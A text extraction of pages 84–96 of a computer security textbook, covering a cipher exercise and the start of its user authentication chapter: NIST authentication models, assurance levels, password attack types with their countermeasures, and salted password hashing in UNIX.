       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 85, 'page_label': '84'}, page_content='84  ChaPTer 2 / CryPTograPhiC ToolS\\nf2 and f3 can be represented by N * N matrices M2 and M3. The intent is to represent \\nthe encryption/decryption process by table look-ups for tables with very large values \\nof N. Such tables would be impractically huge but could, in principle, be constructed. \\nThe scheme works as follows: Construct M1 with a random permutation of all integers \\nbetween 1 and N; that is, each integer appears exactly once in M1. Construct M2 so \\neach row contains a random permutation of the first N integers. Finally, fill in M3 to \\nsatisfy the following condition:\\nf3(f2(f1(k), p), k) = p for all k, p with 1 … k, p … N\\nIn words,\\n1. M1 takes an input k and produces an output x.\\n2. M2 takes inputs x and p giving output z.\\n3. M3 takes inputs z and k and produces p.\\nThe three tables, once constructed, are made public.\\na. It should be clear that it is possible to construct M3 to satisfy the preceding condi-\\ntion. As an example, fill in M3 for the following simple case:\\n5\\n4\\n2\\n3\\n1\\nM1 = M2 = M3 =\\n5\\n4\\n1\\n3\\n2\\n2\\n2\\n3\\n1\\n5\\n3\\n5\\n2\\n4\\n3\\n4\\n1\\n4\\n2\\n4\\n1\\n3\\n5\\n5\\n1\\n5\\n1\\n3\\n4\\n2\\nConvention: The ith element of M1 corresponds to k = i. The ith row of M2 cor-\\nresponds to x = i; the jth column of M2 corresponds to p = j. The ith row of M3 \\ncorresponds to z = i; the jth column of M3 corresponds to k = j. We can look at \\nthis in another way. The ith row of M1 corresponds to the ith column of M3. The \\nvalue of the entry in the ith row selects a row of M2. The entries in the selected M3 \\ncolumn are derived from the entries in the selected M2 row. The first entry in the \\nM2 row dictates where the value 1 goes in the M3 column. The second entry in the \\nM2 row dictates where the value 2 goes in the M3 column, and so on.\\nb. Describe the use of this set of tables to perform encryption and decryption between \\ntwo users.\\nc. Argue that this is a secure scheme.\\n 2.9 Construct a figure similar to Figure 2.9 that includes a digital signature to authenticate \\nthe message in the digital envelope.\\nM02_STAL0611_04_GE_C02.indd   84 10/11/17   2:42 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 86, 'page_label': '85'}, page_content='85\\n3.1 Digital User Authentication Principles\\nA Model for Digital User Authentication\\nMeans of Authentication\\nRisk Assessment for User Authentication\\n3.2 Password-Based Authentication\\nThe Vulnerability of Passwords\\nThe Use of Hashed Passwords\\nPassword Cracking of User-Chosen Passwords\\nPassword File Access Control\\nPassword Selection Strategies\\n3.3 Token-Based Authentication\\nMemory Cards\\nSmart Cards\\nElectronic Identify Cards\\n3.4 Biometric Authentication\\nPhysical Characteristics Used in Biometric Applications\\nOperation of a Biometric Authentication System\\nBiometric Accuracy\\n3.5 Remote User Authentication\\nPassword Protocol\\nToken Protocol\\nStatic Biometric Protocol\\nDynamic Biometric Protocol\\n3.6 Security Issues for User Authentication\\n3.7 Practical Application: An Iris Biometric System\\n3.8 Case Study: Security Problems for ATM Systems\\n3.9 Key Terms, Review Questions, and Problems\\nUser Authentication\\nCHAPTER \\n \\nM03_STAL0611_04_GE_C03.indd   85 10/11/17   2:44 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 87, 'page_label': '86'}, page_content='86  CHAPTER 3 / UsER AUTHEnTiCATion\\nIn most computer security contexts, user authentication is the fundamental building \\nblock and the primary line of defense. User authentication is the basis for most types \\nof access control and for user accountability. User authentication encompasses two \\nfunctions. First, the user identifies herself to the system by presenting a credential, \\nsuch as user ID. Second, the system verifies the user by the exchange of authentica-\\ntion information.\\nFor example, user Alice Toklas could have the user identifier ABTOKLAS. This \\ninformation needs to be stored on any server or computer system that Alice wishes \\nto use, and could be known to system administrators and other users. A typical item \\nof authentication information associated with this user ID is a password, which is kept \\nsecret (known only to Alice and to the system)1. If no one is able to obtain or guess \\nAlice’s password, then the combination of Alice’s user ID and password enables \\nadministrators to set up Alice’s access permissions and audit her activity. Because \\nAlice’s ID is not secret, system users can send her e-mail, but because her password \\nis secret, no one can pretend to be Alice.\\nIn essence, identification is the means by which a user provides a claimed iden-\\ntity to the system; user authentication is the means of establishing the validity of the \\nclaim. Note user authentication is distinct from message authentication. As defined in \\nChapter 2, message authentication is a procedure that allows communicating parties \\nto verify that the contents of a received message have not been altered, and that the \\nsource is authentic. This chapter is concerned solely with user authentication.\\nThis chapter first provides an overview of different means of user authentica -\\ntion, then examines each in some detail.\\n 3.1 DIGITAL USER AUTHENTICATION PRINCIPLES\\nNIST SP 800-63-3 ( Digital Authentication Guideline , October 2016) defines digi -\\ntal user authentication as the process of establishing confidence in user identities \\nthat are presented electronically to an information system. Systems can use the \\n1Typically, the password is stored in hashed form on the server and this hash code may not be secret, as \\nexplained subsequently in this chapter.\\nLearning Objectives\\nAfter studying this chapter, you should be able to:\\n ◆ Discuss the four general means of authenticating a user’s identity.\\n ◆ Explain the mechanism by which hashed passwords are used for user \\nauthentication.\\n ◆ Understand the use of the Bloom filter in password management.\\n ◆ Present an overview of token-based user authentication.\\n ◆ Discuss the issues involved and the approaches for remote user \\nauthentication.\\n ◆ Summarize some of the key security issues for user authentication.\\nM03_STAL0611_04_GE_C03.indd   86 10/11/17   2:44 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 88, 'page_label': '87'}, page_content='3.1 / DiGiTAL UsER AUTHEnTiCATion PRinCiPLEs  87\\nauthenticated identity to determine if the authenticated individual is authorized \\nto perform particular functions, such as database transactions or access to system \\nresources. In many cases, the authentication and transaction, or other authorized \\nfunction, take place across an open network such as the Internet. Equally authen -\\ntication and subsequent authorization can take place locally, such as across a local \\narea network. Table 3.1, from NIST SP 800-171 (Protecting Controlled Unclassified \\nInformation in Nonfederal Information Systems and Organizations, December 2016), \\nprovides a useful list of security requirements for identification and authentication \\nservices.\\nA Model for Digital User Authentication\\nNIST SP 800-63-3 defines a general model for user authentication that involves \\na\\xa0  number of entities and procedur es. We discuss this model with reference to \\nFigure\\xa03.1.\\nThe initial requirement for performing user authentication is that the user \\nmust be registered with the system. The following is a typical sequence for registra-\\ntion. An applicant applies to a registration authority (RA)  to become a subscriber \\nof a credential service provider (CSP). In this model, the RA is a trusted entity that \\nestablishes and vouches for the identity of an applicant to a CSP . The CSP then \\nengages in an exchange with the subscriber. Depending on the details of the over -\\nall authentication system, the CSP issues some sort of electronic credential to the \\nsubscriber. The credential is a data structure that authoritatively binds an identity \\nand additional attributes to a token possessed by a subscriber, and can be verified \\nwhen presented to the verifier in an authentication transaction. The token could \\nbe an encryption key or an encrypted password that identifies the subscriber. The \\nBasic Security Requirements:\\n 1 Identify information system users, processes acting on behalf of users, or devices.\\n 2  Authenticate (or verify) the identities of those users, processes, or devices, as a prerequisite to allowing \\naccess to organizational information systems.\\nDerived Security Requirements:\\n 3  Use multifactor authentication for local and network access to privileged accounts and for network access \\nto non-privileged accounts.\\n 4  Employ replay-resistant authentication mechanisms for network access to privileged and non-privileged accounts.\\n 5 Prevent reuse of identifiers for a defined period.\\n 6 Disable identifiers after a defined period of inactivity.\\n 7 Enforce a minimum password complexity and change of characters when new passwords are created.\\n 8 Prohibit password reuse for a specified number of generations. \\n 9 Allow temporary password use for system logons with an immediate change to a permanent password.\\n10 Store and transmit only cryptographically-protected passwords.\\n11 Obscure feedback of authentication information.\\nTable 3.1 Identification and Authentication Security Requirements (NIST SP 800-171)\\nM03_STAL0611_04_GE_C03.indd   87 10/11/17   2:44 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 89, 'page_label': '88'}, page_content='88  CHAPTER 3 / UsER AUTHEnTiCATion\\ntoken may be issued by the CSP , generated directly by the subscriber, or provided \\nby a third party. The token and credential may be used in subsequent authentica -\\ntion events.\\nOnce a user is registered as a subscriber, the actual authentication process can \\ntake place between the subscriber and one or more systems that perform authen -\\ntication and, subsequently, authorization. The party to be authenticated is called a \\nclaimant, and the party verifying that identity is called a verifier. When a claimant \\nsuccessfully demonstrates possession and control of a token to a verifier through an \\nauthentication protocol, the verifier can verify that the claimant is the subscriber \\nnamed in the corresponding credential. The verifier passes on an assertion about the \\nidentity of the subscriber to the relying party (RP). That assertion includes identity \\ninformation about a subscriber, such as the subscriber name, an identifier assigned \\nat registration, or other subscriber attributes that were verified in the registration \\nprocess. The RP can use the authenticated information provided by the verifier to \\nmake access control or authorization decisions.\\nAn implemented system for authentication will differ from or be more com -\\nplex than this simplified model, but the model illustrates the key roles and functions \\nneeded for a secure authentication system.\\nMeans of Authentication\\nThere are four general means of authenticating a user’s identity, which can be used \\nalone or in combination:\\n• Something the indiv idual knows:  Examples include a password, a personal \\n identification number (PIN), or answers to a prearranged set of questions.\\n• Something the individual possesses:  Examples include electr onic keycards,  \\nsmart cards, and physical keys. This type of authenticator is referred to as a \\ntoken.\\nFigure 3.1 The NIST SP 800-63-3 E-Authentication Architectural Model\\nRegistration\\nauthority\\n(RA)\\nRegistration, credential issuance,\\nand maintenance\\nE-Authentication using\\ntoken and credential\\nIdentity prooﬁng\\nUser registration\\nToken, credential\\nRegistration/issuance\\nAuthenticated session\\nAuthenticated protocol\\nExchange\\nAuthenticated\\nassertion\\nRegistration\\nconﬁrmation\\nToken/credential\\nValidation\\nRelying\\nparty (RP)\\nVeriﬁer\\nSubscriber/\\nclaimant\\nCredential\\nservice\\nprovider (CSP)\\nM03_STAL0611_04_GE_C03.indd   88 10/11/17   2:44 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 90, 'page_label': '89'}, page_content='3.1 / DiGiTAL UsER AUTHEnTiCATion PRinCiPLEs  89\\n• Something the individual is (static biometrics): Examples include recognition \\nby fingerprint, retina, and face.\\n• Something the individual does (dynamic biometrics): Examples include recog-\\nnition by voice pattern, handwriting characteristics, and typing rhythm.\\nAll of these methods, properly implemented and used, can provide secure user \\nauthentication. However, each method has problems. An adversary may be able to \\nguess or steal a password. Similarly, an adversary may be able to forge or steal a token. \\nA user may forget a password or lose a token. Further, there is a significant admin -\\nistrative overhead for managing password and token information on systems and \\nsecuring such information on systems. With respect to biometric authenticators, there \\nare a variety of problems, including dealing with false positives and false negatives, \\nuser acceptance, cost, and convenience. Multifactor authentication refers to the use \\nof more than one of the authentication means in the preceding list (see Figure\\xa0 3.2). \\nThe strength of authentication systems is largely determined by the number of factors \\nincorporated by the system. Implementations that use two factors are considered to \\nbe stronger than those that use only one factor; systems that incorporate three factors \\nare stronger than systems that only incorporate two of the factors, and so on.\\nRisk Assessment for User Authentication\\nSecurity risk assessment in general will be dealt with in Chapter 14. Here, we introduce \\na specific example as it relates to user authentication. There are three separate concepts \\nwe wish to relate to one another: assurance level, potential impact, and areas of risk.\\nFigure 3.2 Multifactor Authentication\\nClient Client\\nAuthenticationprotocol\\nAuthentication\\nlogic using\\nﬁrst factor\\nPass\\nFail\\nAuthenticationprotocol\\nAuthentication\\nlogic using\\nsecond factor\\nPass\\nFail\\nM03_STAL0611_04_GE_C03.indd   89 10/11/17   2:44 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 91, 'page_label': '90'}, page_content='90  CHAPTER 3 / UsER AUTHEnTiCATion\\nAssurAnce LeveL An assurance level describes an organization’s degree of cer -\\ntainty that a user has presented a credential that refers to his or her identity. More \\n specifically, assurance is defined as (1) the degree of confidence in the vetting process \\nused to establish the identity of the individual to whom the credential was issued, and \\n(2) the degree of confidence that the individual who uses the credential is the individ-\\nual to whom the credential was issued. SP 800-63-3 recognizes four levels of assurance:\\n• Level 1: Little or no confidence in the asserted identity’s validity. An example \\nof where this level is appropriate is a consumer registering to participate in a \\ndiscussion at a company website discussion board. Typical authentication tech-\\nnique at this level would be a user-supplied ID and password at the time of the \\ntransaction.\\n• Level 2: Some confidence in the asserted identity’s validity. Level 2 credentials \\nare appropriate for a wide range of business with the public where organi -\\nzations require an initial identity assertion (the details of which are verified \\n independently prior to any action). At this level, some sort of secure authentica-\\ntion protocol needs to be used, together with one of the means of authentication \\nsummarized previously and discussed in subsequent sections.\\n• Level 3: High confidence in the asserted identity’s validity. This level is appro-\\npriate to enable clients or employees to access restricted services of high value \\nbut not the highest value. An example for which this level is appropriate:  \\nA patent attorney electronically submits confidential patent information to the \\nU.S. Patent and Trademark Office. Improper disclosure would give competitors \\na competitive advantage. Techniques that would need to be used at this level \\nrequire more than one factor of authentication; that is, at least two independent \\nauthentication techniques must be used.\\n• Level 4: Very high confidence in the asserted identity’s validity. This level is \\nappropriate to enable clients or employees to access restricted services of very \\nhigh value or for which improper access is very harmful. For example, a law \\nenforcement official accesses a law enforcement database containing crimi -\\nnal records. Unauthorized access could raise privacy issues and/or compromise \\ninvestigations. Typically, level 4 authentication requires the use of multiple fac-\\ntors as well as in-person registration.\\nPotentiAL imPAct A concept closely related to that of assurance level is potential \\nimpact. FIPS 199 (Standards for Security Categorization of Federal Information and \\nInformation Systems, 2004) defines three levels of potential impact on organizations \\nor individuals should there be a breach of security (in our context, a failure in user \\nauthentication):\\n• Low: An authentication error could be expected to have a limited adverse effect \\non organizational operations, organizational assets, or individuals. More spe -\\ncifically, we can say that the error might: (1) cause a degradation in mission \\ncapability to an extent and duration that the organization is able to perform its \\nprimary functions, but the effectiveness of the functions is noticeably reduced; \\n(2) result in minor damage to organizational assets; (3) result in minor financial \\nloss to the organization or individuals; or (4) result in minor harm to individuals.\\nM03_STAL0611_04_GE_C03.indd   90 10/11/17   2:44 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 92, 'page_label': '91'}, page_content='3.1 / DiGiTAL UsER AUTHEnTiCATion PRinCiPLEs  91\\n• Moderate: An authentication error could be expected to have a serious adverse \\neffect. More specifically, the error might: (1) cause a significant degradation in \\nmission capability to an extent and duration that the organization is able to per-\\nform its primary functions, but the effectiveness of the functions is significantly \\nreduced; (2) result in significant damage to organizational assets; (3) result in \\nsignificant financial loss; or (4) result in significant harm to individuals that does \\nnot involve loss of life or serious life-threatening injuries.\\n• High: An authentication error could be expected to have a severe or cata -\\nstrophic adverse effect. The error might: (1) cause a severe degradation in or \\nloss of mission capability to an extent and duration that the organization is not \\nable to perform one or more of its primary functions; (2) result in major damage \\nto organizational assets; (3) result in major financial loss to the organization or \\nindividuals; or (4) result in severe or catastrophic harm to individuals involving \\nloss of life or serious life-threatening injuries.\\nAreAs of risk The mapping between the potential impact and the appropriate \\nlevel of assurance that is satisfactory to deal with the potential impact depends on \\nthe context. Table 3.2 shows a possible mapping for various risks that an organiza -\\ntion may be exposed to. This table suggests a technique for doing risk assessment. \\nFor a given information system or service asset of an organization, the organization \\nneeds to determine the level of impact if an authentication failure occurs, using the \\ncategories of impact, or risk areas, that are of concern.\\nFor example, consider the potential for financial loss if there is an authentica-\\ntion error that results in unauthorized access to a database. Depending on the nature \\nof the database, the impact could be:\\n• Low: At worst, an insignificant or inconsequential unrecoverable financial \\nloss to any party, or at worst, an insignificant or inconsequential organization \\nliability.\\n• Moderate: At worst, a serious unrecoverable financial loss to any party, or a \\nserious organization liability.\\n• High: Severe or catastrophic unrecoverable financial loss to any party; or severe \\nor catastrophic organization liability.\\nAssurance Level Impact Profiles\\nPotential Impact Categories for Authentication Errors 1 2 3 4\\nInconvenience, distress, or damage to standing or reputation Low Mod Mod High\\nFinancial loss or organization liability Low Mod Mod High\\nHarm to organization programs or interests None Low Mod High\\nUnauthorized release of sensitive information None Low Mod High\\nPersonal safety None None Low Mod/\\nHigh\\nCivil or criminal violations None Low Mod High\\nTable 3.2 Maximum Potential Impacts for Each Assurance Level\\nM03_STAL0611_04_GE_C03.indd   91 10/11/17   2:44 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 93, 'page_label': '92'}, page_content='92  CHAPTER 3 / UsER AUTHEnTiCATion\\nThe table indicates that if the potential impact is low, an assurance level of 1 \\nis adequate. If the potential impact is moderate, an assurance level of 2 or 3 should \\nbe achieved. And if the potential impact is high, an assurance level of 4 should be \\nimplemented. Similar analysis can be performed for the other categories shown in \\nthe table. The analyst can then pick an assurance level such that it meets or exceeds \\nthe requirements for assurance in each of the categories listed in the table. So, for \\nexample, for a given system, if any of the impact categories has a potential impact of \\nhigh, or if the personal safety category has a potential impact of moderate or high, \\nthen level 4 assurance should be implemented.\\n 3.2 PASSWORD-BASED AUTHENTICATION\\nA widely used line of defense against intruders is the password system. Virtually all \\nmultiuser systems, network-based servers, Web-based e-commerce sites, and other \\nsimilar services require that a user provide not only a name or identifier (ID) but also \\na password. The system compares the password to a previously stored password for \\nthat user ID, maintained in a system password file. The password serves to authen -\\nticate the ID of the individual logging on to the system. In turn, the ID provides \\nsecurity in the following ways:\\n• The ID determines whether the user is authorized to gain access to a system.  \\nIn some systems, only those who already have an ID filed on the system are \\nallowed to gain access.\\n• The ID determines the privileges accorded to the user. A few users may have \\nadministrator or “superuser” status that enables them to read files and perform \\nfunctions that are especially protected by the operating system. Some systems \\nhave guest or anonymous accounts, and users of these accounts have more \\nlimited privileges than others.\\n• The ID is used in what is referred to as discretionary access control. For exam-\\nple, by listing the IDs of the other users, a user may grant permission to them \\nto read files owned by that user.\\nThe Vulnerability of Passwords\\nIn this subsection, we outline the main forms of attack against password-based \\nauthentication and briefly outline a countermeasure strategy. The remainder of \\n Section 3.2 goes into more detail on the key countermeasures.\\nTypically, a system that uses password-based authentication maintains a pass-\\nword\\xa0file indexed by user ID. One technique that is typically used is to store not the \\nuser’s password but a one-way hash function of the password, as described subsequently.\\nWe can identify the following attack strategies and countermeasures:\\n• Offline dictionary attack: Typically, strong access controls are used to protect \\nthe system’s password file. However, experience shows that determined hack-\\ners can frequently bypass such controls and gain access to the file. The attacker \\nobtains the system password file and compares the password hashes against \\nM03_STAL0611_04_GE_C03.indd   92 10/11/17   2:44 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 94, 'page_label': '93'}, page_content='3.2 / PAssWoRD-BAsED AUTHEnTiCATion  93\\nhashes of commonly used passwords. If a match is found, the attacker can gain \\naccess by that ID/password combination. Countermeasures include controls to \\nprevent unauthorized access to the password file, intrusion detection measures \\nto identify a compromise, and rapid reissuance of passwords should the pass -\\nword file be compromised.\\n• Specific account attack:  The attacker targets a specific account and submits \\npassword guesses until the correct password is discovered. The standard coun-\\ntermeasure is an account lockout mechanism, which locks out access to the \\naccount after a number of failed login attempts. Typical practice is no more \\nthan five access attempts.\\n• Popular password attack: A variation of the preceding attack is to use a popu-\\nlar password and try it against a wide range of user IDs. A user’s tendency is \\nto choose a password that is easily remembered; this unfortunately makes the \\npassword easy to guess. Countermeasures include policies to inhibit the selec-\\ntion by users of common passwords and scanning the IP addresses of authenti-\\ncation requests and client cookies for submission patterns.\\n• Password guessing against single user:  The attacker attempts to gain knowl -\\nedge about the account holder and system password policies and uses that \\nknowledge to guess the password. Countermeasures include training in and \\nenforcement of password policies that make passwords difficult to guess. Such \\npolicies address the secrecy, minimum length of the password, character set, \\nprohibition against using well-known user identifiers, and length of time before \\nthe password must be changed.\\n• Workstation hijacking: The attacker waits until a logged-in workstation is unat-\\ntended. The standard countermeasure is automatically logging the workstation \\nout after a period of inactivity. Intrusion detection schemes can be used to \\ndetect changes in user behavior.\\n• Exploiting user mistakes:  If the system assigns a password, then the user is \\nmore likely to write it down because it is difficult to remember. This situation \\ncreates the potential for an adversary to read the written password. A user may \\nintentionally share a password, to enable a colleague to share files, for example. \\nAlso, attackers are frequently successful in obtaining passwords by using social \\nengineering tactics that trick the user or an account manager into revealing a \\npassword. Many computer systems are shipped with preconfigured passwords \\nfor system administrators. Unless these preconfigured passwords are changed, \\nthey are easily guessed. Countermeasures include user training, intrusion detec-\\ntion, and simpler passwords combined with another authentication mechanism.\\n• Exploiting multiple password use: Attacks can also become much more effec-\\ntive or damaging if different network devices share the same or a similar pass-\\nword for a given user. Countermeasures include a policy that forbids the same \\nor similar password on particular network devices.\\n• Electronic monitoring: If a password is communicated across a network to log \\non to a remote system, it is vulnerable to eavesdropping. Simple encryption will \\nnot fix this problem, because the encrypted password is, in effect, the password \\nand can be observed and reused by an adversary.\\nM03_STAL0611_04_GE_C03.indd   93 10/11/17   2:44 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 95, 'page_label': '94'}, page_content='94  CHAPTER 3 / UsER AUTHEnTiCATion\\nDespite the many security vulnerabilities of passwords, they remain the most \\ncommonly used user authentication technique, and this is unlikely to change in the \\nforeseeable future [HERL12]. Among the reasons for the persistent popularity of \\npasswords are the following:\\n1. Techniques that utilize client-side hardware, such as fingerprint scanners and \\nsmart card readers, require the implementation of the appropriate user authen-\\ntication software to exploit this hardware on both the client and server systems. \\nUntil there is widespread acceptance on one side, there is reluctance to imple-\\nment on the other side, so we end up with a who-goes-first stalemate.\\n2. Physical tokens, such as smart cards, are expensive and/or inconvenient to carry \\naround, especially if multiple tokens are needed.\\n3. Schemes that rely on a single sign-on to multiple services, using one of the non-\\npassword techniques described in this chapter, create a single point of security risk.\\n4. Automated password managers that relieve users of the burden of knowing and \\nentering passwords have poor support for roaming and synchronization across \\nmultiple client platforms, and their usability had not be adequately researched.\\nThus, it is worth our while to study the use of passwords for user authentication \\nin some detail.\\nThe Use of Hashed Passwords\\nA widely used password security technique is the use of hashed passwords and a salt \\nvalue. This scheme is found on virtually all UNIX variants as well as on a number \\nof other operating systems. The following procedure is employed (see Figure 3.3a). \\nTo load a new password into the system, the user selects or is assigned a password. \\nThis password is combined with a fixed-length salt value [MORR79]. In older imple-\\nmentations, this value is related to the time at which the password is assigned to the \\nuser. Newer implementations use a pseudorandom or random number. The password \\nand salt serve as inputs to a hashing algorithm to produce a fixed-length hash code. \\nThe hash algorithm is designed to be slow to execute in order to thwart attacks. The \\nhashed password is then stored, together with a plaintext copy of the salt, in the \\npassword file for the corresponding user ID. The hashed password method has been \\nshown to be secure against a variety of cryptanalytic attacks [WAGN00].\\nWhen a user attempts to log on to a UNIX system, the user provides an ID \\nand a password (see Figure 3.3b). The operating system uses the ID to index into the \\npassword file and retrieve the plaintext salt and the encrypted password. The salt \\nand user-supplied password are used as input to the encryption routine. If the result \\nmatches the stored value, the password is accepted.\\nThe salt serves three purposes:\\n• It prevents duplicate passwords from being visible in the password file. Even if \\ntwo users choose the same password, those passwords will be assigned different \\nsalt values. Hence, the hashed passwords of the two users will differ.\\n• It greatly increases the difficulty of offline dictionary attacks. For a salt of length \\nb bits, the number of possible passwords is increased by a factor of 2b, increasing \\nthe difficulty of guessing a password in a dictionary attack.\\nM03_STAL0611_04_GE_C03.indd   94 10/11/17   2:44 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 96, 'page_label': '95'}, page_content='3.2 / PAssWoRD-BAsED AUTHEnTiCATion  95\\n• It becomes nearly impossible to find out whether a person with passwords on \\ntwo or more systems has used the same password on all of them.\\nTo see the second point, consider the way that an offline dictionary attack \\nwould work. The attacker obtains a copy of the password file. Suppose first that the \\nsalt is not used. The attacker’s goal is to guess a single password. To that end, the \\nattacker submits a large number of likely passwords to the hashing function. If any \\nof the guesses matches one of the hashes in the file, then the attacker has found a \\npassword that is in the file. But faced with the UNIX scheme, the attacker must take \\nFigure 3.3 UNIX Password Scheme\\nSlow hash\\nfunction\\nSalt\\nSalt\\nPassword\\nSlow hash\\nfunction\\nPassword\\nHashed password\\nUser ID\\nUser Id\\nSalt Hash code\\nUser ID Salt Hash code\\nPassword ﬁle\\nPassword ﬁle\\nLoad\\nCompare\\nSelect\\n(a) Loading a new password\\n(b) Verifying a password\\nM03_STAL0611_04_GE_C03.indd   95 10/11/17   2:44 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 97, 'page_label': '96'}, page_content='96  CHAPTER 3 / UsER AUTHEnTiCATion\\neach guess and submit it to the hash function once for each salt value in the dictionary \\nfile, multiplying the number of guesses that must be checked.\\nThere are two threats to the UNIX password scheme. First, a user can gain \\naccess on a machine using a guest account or by some other means then run\\xa0a \\npassword guessing program, called a password cracker, on that machine. The \\nattacker should be able to check many thousands of possible passwords with \\nlittle resource consumption. In addition, if an opponent is able to obtain a copy \\nof the password file, then a cracker program can be run on another machine at \\nleisure. This enables the opponent to run through millions of possible passwords \\nin a reasonable period.\\nuniX imPLementAtions Since the original development of UNIX, many imple -\\nmentations have relied on the following password scheme. Each user selects a pass-\\nword of up to eight printable characters in length. This is converted into a 56-bit \\nvalue (using 7-bit ASCII) that serves as the key input to an encryption routine. The \\nhash routine, known as crypt(3), is based on DES. A 12-bit salt value is used. The \\nmodified DES algorithm is executed with a data input consisting of a 64-bit block \\nof zeros. The output of the algorithm then serves as input for a second encryption. \\nThis process is repeated for a total of 25 encryptions. The resulting 64-bit output is \\nthen translated into an 11 -character sequence. The modification of the DES algo -\\nrithm 